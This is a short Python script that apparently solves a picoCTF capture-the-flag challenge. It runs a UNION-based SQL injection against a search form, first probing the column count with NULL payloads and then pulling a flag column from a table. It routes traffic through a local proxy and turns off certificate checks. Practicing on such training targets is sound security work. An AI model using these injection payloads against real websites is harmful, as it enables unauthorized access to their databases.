import json
import string
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print


s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

s.cookies["PHPSESSID"] = "kp54b142dr964dsrp142ri4vb1"


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "
        response: r.Response = s.post(
            URL,
            data="search=Algiers"
            + quote(PAYLOAD.strip(", ") + " --")
            + "&submit=Search",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )

        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "http://saturn.picoctf.net:65284/welcome.php"

    PAYLOAD = (
        "' UNION SELECT "
        + ", ".join(
            (cols := ["flag"])
            + ("NULL, " * (get_col_nums(URL, 10) - len(cols))).strip(", ").split(", ")
        ).strip(", ")
        + " FROM more_table --"
    )
    response: r.Response = s.post(
        URL,
        data="search=Algiers" + quote(PAYLOAD) + "&submit=Search",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    print(response.text)
    print(response.status_code)


if __name__ == "__main__":
    main()
import requests as r
